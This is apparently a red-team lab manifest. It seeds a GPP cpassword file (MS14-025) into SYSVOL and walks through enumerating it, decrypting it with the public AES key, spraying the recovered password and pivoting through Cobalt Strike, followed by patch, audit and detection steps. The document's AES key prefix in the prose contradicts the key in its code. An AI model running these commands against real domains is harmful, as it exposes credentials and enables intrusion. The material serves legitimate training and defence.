# Bolt-on: GPP cpassword in SYSVOL (MS14-025)
# --------------------------------------------
# Install drops a Group Policy Preferences Groups.xml under SYSVOL containing
# a `cpassword` attribute. Pre-MS14-025 (KB2962486), GPP encrypted these
# attributes with a static AES key whose value Microsoft documented in MSDN —
# any Domain User who can read SYSVOL (which is everyone) can decrypt the
# resulting ciphertext to plaintext in milliseconds with PowerSploit's
# Get-GPPPassword or gpp-decrypt.
#
# Patch installs KB2962486 — which removes the GPP UI's ability to create new
# cpassword attributes — AND deletes the offending Groups.xml. KB2962486 is
# a one-way change: the KB cannot be cleanly uninstalled and is rolled into
# subsequent monthly cumulative updates. We declare rollback_supported = true
# because we DO restore the offending XML file in patch_revert (the KB stays
# put, but the lab is re-exploitable because the XML returns).
#
# Elastic rule UUIDs: no direct rule fires on cpassword discovery (defender
# has no telemetry on attacker-side XML reads). The closest signals are
# Sysmon FileCreate on Groups.xml + LSASS reads after recovery. Marked
# no-rule with fallback template.

id: bolton.credential-exposure.gpp-cpassword-sysvol
slug: gpp-cpassword-sysvol
name: "GPP cpassword in SYSVOL (MS14-025)"
version: "1.0.0"
author: "Red Team Infra"
last_updated: 2026-05-19

category: credential-exposure
subcategory: group-policy-preferences
tags:
  - sysvol
  - cpassword
  - ms14-025
  - kb2962486
  - credential-access
  - group-policy
description: >
  Drops a Group Policy Preferences Groups.xml file into
  \\<domain>\SYSVOL\<domain>\Policies\{guid}\Machine\Preferences\Groups\
  containing a `cpassword` attribute. Pre-MS14-025 (KB2962486) Microsoft
  encrypted GPP attributes with a static, publicly-documented AES key — any
  Domain User who can read SYSVOL can decrypt the value to plaintext in
  milliseconds. The canonical Get-GPPPassword cmdlet recovers the password
  on a single line of PowerShell. This is the persistent legacy variant
  of credential exposure on AD networks that retained pre-2014 GPOs.

cve:
  - "CVE-2014-1812"
references:
  - "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2014-1812"
  - "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025"
  - "https://support.microsoft.com/en-us/topic/kb2962486"
  - "https://attack.mitre.org/techniques/T1552/006/"

mitre:
  tactic:
    id: TA0006
    name: "Credential Access"
  technique:
    id: T1552
    name: "Unsecured Credentials"
  subtechnique:
    id: T1552.006
    name: "Group Policy Preferences"

detection:
  # Reading a SYSVOL file is a Domain User action with no high-fidelity
  # signal. Sysmon FileCreate on Groups.xml fires at install time (operator
  # observable) but doesn't catch attacker-side discovery. Phase 4 fallback
  # template covers the canonical Sysmon file-write pattern.
  coverage_status: no-rule
  elastic_rules: []
  fallback_rule_template: "webapp/bolton/rule_templates/gpp-cpassword-sysvol.j2.yml"
  signal_sources:
    - "Sysmon Event 11 (FileCreate) — Groups.xml under SYSVOL\\Policies"
    - "Windows Event 4663 (object access — SYSVOL share read by non-admin)"
    - "Sysmon Event 1 (process create) — powershell.exe with Get-GPPPassword"
    - "Auditd / netflow — anonymous SMB read of SYSVOL\\Policies\\*\\Preferences"

targets:
  supported_os:
    - family: windows
      min_version: "2012"
      max_version: "2025"
      edition_in: ["Datacenter", "Standard"]
  required_roles:
    - domain_controller
  required_services: []
  required_domain_function_level: null

depends_on: []
conflicts_with: []

side_effects:
  global: true       # SYSVOL is replicated to all DCs in the domain
  network_visible: false
  reboot_required: false

install:
  estimated_time_seconds: 30
  steps:
    - ansible_role: community.windows.win_powershell
      description: "Discover the SYSVOL Policies path and create the Groups Preferences directory."
      role_vars:
        script: |
          $domDn = (Get-ADDomain).DistinguishedName
          $domFqdn = (Get-ADDomain).DNSRoot
          $policiesRoot = "\\$domFqdn\SYSVOL\$domFqdn\Policies"
          # Use a fixed GUID for the bolt-on policy so it is reproducible
          $guid = "{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}"
          $polPath = "$policiesRoot\$guid\Machine\Preferences\Groups"
          New-Item -Path $polPath -ItemType Directory -Force | Out-Null
          New-Item -Path "$policiesRoot\$guid\Machine" -Name "gpt.ini" -ItemType File `
                  -Value "[General]`r`nVersion=1`r`n" -Force | Out-Null
    - ansible_role: community.windows.win_copy
      description: "Drop the malicious Groups.xml with the GPP cpassword field."
      role_vars:
        dest: '\\{{ ansible_domain }}\SYSVOL\{{ ansible_domain }}\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups\Groups.xml'
        # cpassword value below is the documented MS-static-AES-key
        # encryption of "Summer2014!" — recoverable via Get-GPPPassword.
        # See https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be
        content: |
          <?xml version="1.0" encoding="utf-8"?>
          <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
            <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="bolton_lure" image="2"
                  changed="2026-05-19 12:00:00" uid="{F1B1B1F1-CAFE-DEAD-BEEF-000000000001}">
              <Properties action="C" newName="" fullName="" description="Lab bolt-on lure account"
                          cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                          changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
                          subAuthority="" userName="bolton_lure"/>
            </User>
          </Groups>
  verify:
    probe: |
      $domFqdn = (Get-ADDomain).DNSRoot
      $path = "\\$domFqdn\SYSVOL\$domFqdn\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups\Groups.xml"
      if ((Test-Path $path) -and ((Get-Content $path -Raw) -match 'cpassword="[^"]+"')) { exit 0 } else { exit 1 }
    timeout_seconds: 60
    expect_exit_code: 0

uninstall:
  description: "Remove the bolt-on Policies subtree from SYSVOL — XML is purged on all DCs once SYSVOL replication completes."
  estimated_time_seconds: 60
  steps:
    - ansible_role: community.windows.win_powershell
      description: "Recursively delete the bolt-on policy GUID directory."
      role_vars:
        script: |
          $domFqdn = (Get-ADDomain).DNSRoot
          $polDir  = "\\$domFqdn\SYSVOL\$domFqdn\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}"
          if (Test-Path $polDir) {
            Remove-Item -Path $polDir -Recurse -Force
          }
  verify:
    probe: |
      $domFqdn = (Get-ADDomain).DNSRoot
      $polDir  = "\\$domFqdn\SYSVOL\$domFqdn\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}"
      if (Test-Path $polDir) { exit 1 } else { exit 0 }
    timeout_seconds: 30
    expect_exit_code: 0

patch:
  description: >
    Install KB2962486 (MS14-025) — removes the Group Policy Preferences UI
    capability to set new cpassword attributes — AND scan SYSVOL for any
    existing Groups.xml / Services.xml / DataSources.xml / Drives.xml /
    Printers.xml / ScheduledTasks.xml containing a cpassword attribute,
    deleting all hits. This is the canonical Microsoft-recommended
    remediation. Note: KB2962486 is permanent — it cannot be cleanly
    uninstalled. The patch_revert below re-creates the offending XML; the
    KB stays installed.
  patch_reference:
    - "https://support.microsoft.com/en-us/topic/kb2962486"
    - "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025"
  complexity: medium
  side_effects:
    - "Installs KB2962486 — Group Policy Preferences UI no longer accepts cpassword inputs"
    - "All existing GPP XML files in SYSVOL with cpassword attributes are deleted"
    - "Operators must migrate password-setting workflows to LAPS / Just-In-Time admin / Group Managed Service Accounts"
    - "KB2962486 cannot be uninstalled — rolled into subsequent monthly cumulatives"
  rollback_supported: true       # we re-create the XML, even though the KB persists
  steps:
    - ansible_role: ansible.windows.win_updates
      description: "Install KB2962486 (or current cumulative successor)."
      role_vars:
        category_names:
          - SecurityUpdates
          - CriticalUpdates
        accept_list:
          - "KB2962486"
        reboot: false
    - ansible_role: community.windows.win_powershell
      description: "Scan SYSVOL and delete any GPP XML with cpassword attributes."
      role_vars:
        script: |
          $domFqdn = (Get-ADDomain).DNSRoot
          $sysvol  = "\\$domFqdn\SYSVOL\$domFqdn\Policies"
          $hits = Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","DataSources.xml","Drives.xml","Printers.xml","ScheduledTasks.xml" -ErrorAction SilentlyContinue
          foreach ($f in $hits) {
            $body = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue
            if ($body -match 'cpassword="[^"]+"') {
              Remove-Item -Path $f.FullName -Force
            }
          }
  verify:
    probe: |
      $kb = Get-HotFix -Id KB2962486 -ErrorAction SilentlyContinue
      $domFqdn = (Get-ADDomain).DNSRoot
      $sysvol = "\\$domFqdn\SYSVOL\$domFqdn\Policies"
      $remaining = Get-ChildItem -Path $sysvol -Recurse -Include "Groups.xml","Services.xml","DataSources.xml","Drives.xml","Printers.xml","ScheduledTasks.xml" -ErrorAction SilentlyContinue |
        Where-Object { (Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue) -match 'cpassword="[^"]+"' }
      if ($kb -and -not $remaining) { exit 0 } else { exit 1 }
    timeout_seconds: 180
    expect_exit_code: 0
  exploit_probe_after_patch: "webapp/bolton/exploit_probes/gpp_cpassword_check.sh"

patch_revert:
  description: >
    Re-drop the bolt-on Groups.xml back into SYSVOL. KB2962486 remains
    installed (it cannot be cleanly uninstalled), but Get-GPPPassword will
    still decrypt the static-key-encrypted blob in the resurrected XML —
    the KB only blocks the UI from CREATING new ones; it does not refuse
    to deploy existing XML files via gpupdate.
  estimated_time_seconds: 30
  steps:
    - ansible_role: community.windows.win_powershell
      description: "Recreate the bolt-on Policies subdirectory."
      role_vars:
        script: |
          $domFqdn = (Get-ADDomain).DNSRoot
          $polPath = "\\$domFqdn\SYSVOL\$domFqdn\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups"
          New-Item -Path $polPath -ItemType Directory -Force | Out-Null
    - ansible_role: community.windows.win_copy
      description: "Re-drop the malicious Groups.xml."
      role_vars:
        dest: '\\{{ ansible_domain }}\SYSVOL\{{ ansible_domain }}\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups\Groups.xml'
        content: |
          <?xml version="1.0" encoding="utf-8"?>
          <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
            <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="bolton_lure" image="2"
                  changed="2026-05-19 12:00:00" uid="{F1B1B1F1-CAFE-DEAD-BEEF-000000000001}">
              <Properties action="C" newName="" fullName="" description="Lab bolt-on lure account"
                          cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                          changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
                          subAuthority="" userName="bolton_lure"/>
            </User>
          </Groups>
  verify:
    probe: |
      $domFqdn = (Get-ADDomain).DNSRoot
      $path = "\\$domFqdn\SYSVOL\$domFqdn\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups\Groups.xml"
      if ((Test-Path $path) -and ((Get-Content $path -Raw) -match 'cpassword="[^"]+"')) { exit 0 } else { exit 1 }
    timeout_seconds: 30
    expect_exit_code: 0
  warning: "Groups.xml back in SYSVOL. Get-GPPPassword -Path SYSVOL returns the plaintext in <1s."

cost:
  storage_mb: 0
  cpu_pct: 0
  detectability: quiet

curriculum:
  title: "GPP cpassword in SYSVOL — credential exposure via Group Policy Preferences"
  summary: >
    Walkthrough of MS14-025 / CVE-2014-1812 against the test lab. The
    bolt-on drops a `Groups.xml` containing a `cpassword` attribute on
    `\\testlab.local\SYSVOL` (replicated to tldc01 at 10.99.50.10).
    You enumerate SYSVOL as a Domain User, discover the cpassword,
    decrypt it with the published Microsoft AES key, validate the
    credential, and review the KB2962486 patch story.
  learning_objectives:
    - "Explain why GPP cpassword is recoverable in milliseconds — Microsoft published the AES key in MSDN."
    - "Enumerate SYSVOL for cpassword-bearing XML files using a Domain User credential."
    - "Decrypt the cpassword with PowerSploit Get-GPPPassword and Impacket-derived helpers."
    - "Distinguish what KB2962486 does (block CREATION) from what it does NOT do (delete existing XML)."
  prerequisites:
    - "Low-privilege TESTLAB credentials (`TESTLAB\\j.doe:Welcome1!`) — any Domain User can read SYSVOL"
    - "Network reach from Kali (192.168.1.100, via bastion) to tldc01 (10.99.50.10) on 445 (SMB) and 88 (Kerberos)"
    - "Impacket >= 0.11 on Kali (provides smbclient.py and lookupsid.py)"
    - "Cobalt Strike beacon on tlws01 (10.99.50.12) as TESTLAB\\j.doe for the PowerSploit / BOF alternative path"
    - "PowerSploit cloned — https://github.com/PowerShellMafia/PowerSploit (provides Get-GPPPassword)"
    - "gpp-decrypt (`apt install gpp-decrypt` on Kali) OR the one-liner Python equivalent in step 3"
  estimated_total_minutes: 35
  steps:
    - id: "01-list-sysvol"
      title: "Enumerate SYSVOL as a Domain User"
      estimated_minutes: 6
      markdown: |
        ## Step 1 — Walk the SYSVOL share

        SYSVOL is world-readable to every Domain User — that is its
        design (clients pull Group Policy from it). Any authenticated
        TESTLAB user can list it.

        **Option A — Impacket from Kali (preferred)**:

        ```bash
        # From Kali — recursively walk SYSVOL Policies and grab any *.xml
        smbclient.py 'TESTLAB.LOCAL/j.doe:Welcome1!@10.99.50.10'
        # smb> use SYSVOL
        # smb> cd testlab.local\Policies
        # smb> ls
        ```

        Or non-interactive — list every Group Policy XML:

        ```bash
        smbmap -u j.doe -p 'Welcome1!' -d testlab.local -H 10.99.50.10 \
            -R SYSVOL --depth 8 -A 'Groups\.xml|Services\.xml|DataSources\.xml|Drives\.xml|Printers\.xml|ScheduledTasks\.xml'
        ```

        Expected (truncated):

        ```
        ./testlab.local/Policies/{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}/Machine/Preferences/Groups/Groups.xml
        ```

        That is the bolt-on's seeded GPO. Pull it down:

        ```bash
        smbget -U TESTLAB/j.doe%Welcome1! \
            'smb://10.99.50.10/SYSVOL/testlab.local/Policies/{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}/Machine/Preferences/Groups/Groups.xml' \
            -O
        cat Groups.xml
        ```

        Expected content (truncated):

        ```xml
        <?xml version="1.0" encoding="utf-8"?>
        <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
          <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="bolton_lure" image="2"
                changed="2026-05-19 12:00:00" uid="{F1B1B1F1-CAFE-DEAD-BEEF-000000000001}">
            <Properties action="C" newName="" fullName="" description="Lab bolt-on lure account"
                        cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                        changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
                        subAuthority="" userName="bolton_lure"/>
          </User>
        </Groups>
        ```

        The `cpassword="..."` value is the static-AES-encrypted blob —
        the entire prize.

        **Option B — Cobalt Strike BOF (from beacon on tlws01)**:

        TrustedSec's CS-Situational-Awareness-BOF ships `findLocalAdminAccess`
        and `getDFS` BOFs; for SYSVOL-specific enumeration use the
        general-purpose `ls` BOF chained with a search:

        ```
        beacon> ls \\testlab.local\SYSVOL\testlab.local\Policies
        beacon> powerpick Get-ChildItem -Path \\testlab.local\SYSVOL -Recurse -Include Groups.xml,Services.xml,Drives.xml -ErrorAction SilentlyContinue
        ```

        > **Elastic rule that fires**: nothing for raw SYSVOL listing —
        > Domain Users reading their own GPO surface is baseline.
        > Defenders cannot meaningfully alert on this without a
        > custom rule for "non-server processes reading Groups.xml",
        > which the bolt-on's fallback template materialises.
      assessment:
        question: "Why is SYSVOL world-readable to every Domain User by design — and why does that make GPP cpassword devastating?"
        options:
          - "It's misconfigured by default; admins should restrict it but rarely do."
          - "SYSVOL replicates the Group Policy objects that all domain-joined clients must download to apply GPOs at startup — its NTFS / share ACLs grant `Authenticated Users` read access by design. The instant a cpassword lands in any file under SYSVOL, every domain user can read it."
          - "Domain Users are members of Backup Operators by default."
          - "SYSVOL is only readable when SMB signing is disabled."
        correct_index: 1
        explanation: >
          SYSVOL must be world-readable for GPO application to work —
          every client fetches its policies from there on startup. The
          intersection of "world-readable share" + "static AES key
          published by Microsoft" is what makes cpassword a one-shot
          credential leak. Restricting SYSVOL ACLs breaks Group Policy
          for the entire domain, so the only safe mitigation is to
          ensure cpassword never exists in any file under SYSVOL.
    - id: "02-discover-cpassword-systematically"
      title: "Systematic search across the whole SYSVOL"
      estimated_minutes: 6
      markdown: |
        ## Step 2 — Scan every cpassword-bearing file at once

        In a real engagement you don't know which GPO has the
        cpassword. Use one of the canonical scanners.

        **Option A — PowerSploit Get-GPPPassword (from beacon on tlws01)**:

        ```
        beacon> powerpick Import-Module C:\Tools\PowerSploit\Exfiltration\Get-GPPPassword.ps1
        beacon> powerpick Get-GPPPassword
        ```

        Expected output:

        ```
        UserName : bolton_lure
        NewName  :
        Password : Summer2014!
        Changed  : 2026-05-19 12:00:00
        File     : \\testlab.local\SYSVOL\testlab.local\Policies\{B1B1F1B1-DEAD-BEEF-CAFE-000000000001}\Machine\Preferences\Groups\Groups.xml
        ```

        Get-GPPPassword walks SYSVOL, finds every cpassword attribute
        across `Groups.xml / Services.xml / DataSources.xml /
        Drives.xml / Printers.xml / ScheduledTasks.xml`, decrypts each
        with the static AES key, and prints the plaintext alongside
        the path. Repo:
        https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

        **Option B — From Kali, using the documented Microsoft AES key**:

        Microsoft published the AES key in MSDN —
        `4e9906e8fcb66cc9faf49310620ffee8d3e6b2c4...` — and the GPP
        encryption scheme is straight AES-CBC. A one-shot Python
        decryptor:

        ```bash
        # /opt/gpp-decrypt-modern.py — runs on Kali
        python3 -c "
        from base64 import b64decode
        from Crypto.Cipher import AES
        key = bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b')
        ct = 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
        # GPP base64 strips padding — add it back
        ct = ct + '=' * (-len(ct) % 4)
        raw = b64decode(ct)
        pt = AES.new(key, AES.MODE_CBC, IV=b'\x00'*16).decrypt(raw)
        # PKCS7-style: last byte is padding length; ignore the trailing UTF-16LE null
        print(pt.rstrip(b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10').decode('utf-16le'))
        "
        ```

        Expected output:

        ```
        Summer2014!
        ```

        **Option C — Kali's `gpp-decrypt` tool** (already installed):

        ```bash
        gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
        # Output: Summer2014!
        ```

        Whichever path you choose, the entire decryption finishes in
        <100ms — there's no cracking, no wordlist, no GPU. Microsoft's
        key is public.

        > **Elastic rule that fires**: none on the SYSVOL read or the
        > decryption — both happen on the attacker's host with no
        > authentication side-channel. The bolt-on's
        > `fallback_rule_template` materialises a Sysmon-Event-11
        > rule for FileCreate of `Groups.xml` under
        > `SYSVOL\Policies` (catches the install side, not attacker
        > discovery).
      assessment:
        question: "GPP cpassword is recoverable in milliseconds — no GPU cracking required. Why?"
        options:
          - "The encryption is rot13."
          - "Microsoft published the AES-256 key used by GPP encryption in MSDN documentation. Anyone with the ciphertext + key can decrypt directly — no brute force needed."
          - "The cpassword is hashed with MD5, which is broken."
          - "GPP uses a key derived from the machine SID, which is recoverable from SYSVOL too."
        correct_index: 1
        explanation: >
          The AES-256 key is in MSDN —
          https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be —
          which means anyone who can read the ciphertext can decrypt it
          in constant time. That is what makes MS14-025 categorically
          different from password-cracking attacks (Kerberoasting,
          AS-REP roast) where strong passwords mitigate the risk. With
          GPP cpassword, even a 200-character random password decrypts
          to plaintext — the key is public.
    - id: "03-validate-and-pivot"
      title: "Validate the credential and pivot"
      estimated_minutes: 6
      markdown: |
        ## Step 3 — Use the decrypted password

        `bolton_lure` is the local account name embedded in the bolt-on's
        Groups.xml — in a real engagement this would be a local admin
        account propagated to every domain workstation via the GPO. In
        the lab the password is `Summer2014!`.

        First check whether `bolton_lure` exists as a domain account
        (it may or may not, depending on whether the GPO has actually
        applied):

        ```bash
        # From Kali
        lookupsid.py 'TESTLAB.LOCAL/j.doe:Welcome1!@10.99.50.10' | grep -i bolton
        ```

        Then test the credential against every TESTLAB host:

        ```bash
        # Spray the cpassword-derived credential across SMB
        nxc smb 10.99.50.10-13 -u bolton_lure -p 'Summer2014!' -d testlab.local --continue-on-success
        ```

        Expected on hosts where the GPO has applied:

        ```
        SMB  10.99.50.12  445  TLWS01  [+] testlab.local\bolton_lure:Summer2014! (Pwn3d!)
        ```

        `(Pwn3d!)` from nxc means the credential is also a local
        administrator — typical for GPP-distributed accounts since
        the GPO usually adds them to the local Administrators group
        as part of the same XML.

        From the beacon on tlws01 you can pivot laterally with the
        credential:

        ```
        beacon> make_token TESTLAB\bolton_lure Summer2014!
        beacon> ls \\tlms01.testlab.local\C$
        ```

        > **Elastic rule that fires**: `Successful logon by unusual
        > local account` or `Lateral Movement via SMB Admin Share` —
        > generic lateral-movement rules. The specific link back to
        > the GPP cpassword chain has to be made manually by the
        > analyst (correlating the credential's first use with the
        > Groups.xml read pattern).
    - id: "04-detection-and-mitigation"
      title: "The KB2962486 patch story + canonical mitigation"
      estimated_minutes: 9
      markdown: |
        ## Step 4 — Patch + the KB2962486 nuance

        Click **Patch** on this card. The bolt-on's patch block does
        two things:

        1. Installs **KB2962486** (or its cumulative successor) on the
           DC. This removes the Group Policy Preferences UI's ability
           to CREATE new cpassword attributes — but **it does not
           delete existing cpassword XML files**.
        2. Walks `\\testlab.local\SYSVOL` and DELETES every `*.xml`
           under `Policies\*\Preferences\` whose body contains
           `cpassword="..."` — Groups.xml, Services.xml, DataSources.xml,
           Drives.xml, Printers.xml, ScheduledTasks.xml.

        Re-run step 2's `Get-GPPPassword` — it should now return zero
        results.

        ### The nuance every operator should understand

        KB2962486 is a **prophylactic patch**:
        - It blocks NEW cpassword creation via the GPP UI.
        - It does NOT delete existing cpassword XML files.
        - It does NOT prevent gpupdate from APPLYING an existing
          cpassword XML file — clients will still process it.
        - The KB cannot be cleanly uninstalled (rolled into all
          subsequent cumulatives).

        That means: **a domain patched in 2014 may still have
        cpassword XML files in SYSVOL today**. The audit has to be
        explicit.

        ### Defensive audit query (run quarterly)

        ```powershell
        # On any domain-joined host
        $domain = (Get-ADDomain).DNSRoot
        Get-ChildItem -Path "\\$domain\SYSVOL\$domain\Policies" -Recurse `
            -Include Groups.xml, Services.xml, DataSources.xml, `
                     Drives.xml, Printers.xml, ScheduledTasks.xml `
            -ErrorAction SilentlyContinue |
          Where-Object { (Get-Content $_.FullName -Raw) -match 'cpassword="[^"]+"' } |
          Select-Object FullName, LastWriteTime
        ```

        Any non-empty result is a P1 finding — the XML must be deleted
        AND every credential it ever contained must be rotated
        (because the XML may have been replicated and cached on hosts
        beyond your control).

        ### Strategic mitigations beyond the patch

        | Control | Why |
        |---|---|
        | **Microsoft LAPS** (Local Administrator Password Solution) | Rotates per-host local admin passwords automatically, stores in AD, ACL-protected — the strategic replacement for GPP-set local admin passwords |
        | **Just-In-Time admin via PIM** | Eliminates standing local admin credentials entirely |
        | **Group Managed Service Accounts** | Replaces GPP-set service-account passwords with auto-rotated 240-bit secrets |
        | **SYSVOL read auditing on the DC** | Sysmon Event 11 / Event 4663 on `Groups.xml` reads — high false-positive rate, only useful for incident-response forensics |

        > **Elastic rule that fires**: Sysmon Event 11 (FileCreate)
        > catches the install-side XML drop. The bolt-on's
        > `fallback_rule_template`
        > (`webapp/bolton/rule_templates/gpp-cpassword-sysvol.j2.yml`)
        > materialises the canonical detection (Event 11 on
        > `Groups.xml` in SYSVOL with file body matching
        > `cpassword="..."`). For attacker discovery the highest
        > available signal is process-create of `powershell.exe` with
        > a command line matching `Get-GPPPassword`.
      assessment:
        question: "Your environment installed KB2962486 in 2015. Today, an auditor finds a `Groups.xml` with a cpassword in SYSVOL. How is this possible?"
        options:
          - "KB2962486 was uninstalled — somebody rolled the DC back."
          - "KB2962486 blocks NEW cpassword creation via the GPP UI but does NOT delete pre-existing cpassword XML files — the file has likely been there since before the patch was installed and has never been cleaned up."
          - "The auditor is wrong; cpassword cannot exist post-patch."
          - "Cosmic-ray bit-flip."
        correct_index: 1
        explanation: >
          KB2962486 is prophylactic — it stops the GPP MMC snap-in
          from CREATING new cpassword fields. It does not scan SYSVOL
          and delete legacy XML files. Many environments installed
          the KB in 2014/2015 but never went back to clean up the
          pre-existing cpassword files, which then quietly continued
          to apply to new domain-joined hosts. Audit is non-negotiable
          even on long-patched domains.
    - id: "05-blue-team-completeness"
      title: "Defensive completeness check"
      estimated_minutes: 8
      markdown: |
        ## Step 5 — Confirm the lab is fully hardened

        The patch closes the immediate primitive but a thorough
        remediation has more steps. Run the full defensive checklist:

        ### 1. SYSVOL is clean

        ```bash
        # From Kali — the bolt-on's exploit probe
        ./webapp/bolton/exploit_probes/gpp_cpassword_check.sh \
            'TESTLAB.LOCAL/j.doe:Welcome1!@10.99.50.10'
        # Expected exit code: 1 — no cpassword files found
        ```

        ### 2. KB2962486 is installed on every DC (not just one)

        ```powershell
        # Run via SSM PowerShell against each DC
        Get-HotFix -Id KB2962486 -ErrorAction SilentlyContinue |
          Select-Object PSComputerName, HotFixID, InstalledOn
        ```

        Modern Windows Server 2022 has KB2962486 rolled into the OS
        baseline, but verify explicitly for legacy 2012 R2 / 2016 DCs.

        ### 3. Any credentials that were ever in a cpassword are
        rotated

        ```powershell
        # On tldc01 — find the bolt-on lure account and disable it
        Get-ADUser -Filter {SamAccountName -eq 'bolton_lure'} |
          Disable-ADAccount
        # Same for any local accounts on domain-joined hosts that match
        # the bolton_lure name (would require a separate enumeration
        # script via SSM or Ansible).
        ```

        Even if `bolton_lure` was never used, treat it as compromised
        — anyone who read SYSVOL between bolt-on install and now has
        the password.

        ### 4. LAPS or equivalent is rolled out for local admin
        accounts

        Verify LAPS GPO is applied:

        ```powershell
        # On any domain-joined host
        Get-AdmPwdPassword -ComputerName TLWS01
        # Should return a per-host random password, not a static value
        ```

        ### 5. Detection rule is live

        Confirm the bolt-on's `fallback_rule_template` (or your custom
        equivalent) is deployed in Elastic and tested:

        ```bash
        # Re-arm the lab (patch_revert), wait 30 seconds,
        # then check Kibana for the detection
        # Expected: the rule "GPP cpassword XML in SYSVOL" fires
        ```

        > **Elastic rule that fires (revert phase)**: Sysmon Event 11
        > on `Groups.xml` creation under SYSVOL\Policies — use this
        > to verify the detection pipeline works before declaring the
        > exercise complete.

        > **Rollback**: the manifest declares `patch_revert` — clicking
        > Revert re-drops the Groups.xml. The KB stays installed (it
        > cannot be uninstalled), but the exploit chain works again
        > because the static AES key still decrypts the resurrected
        > XML.

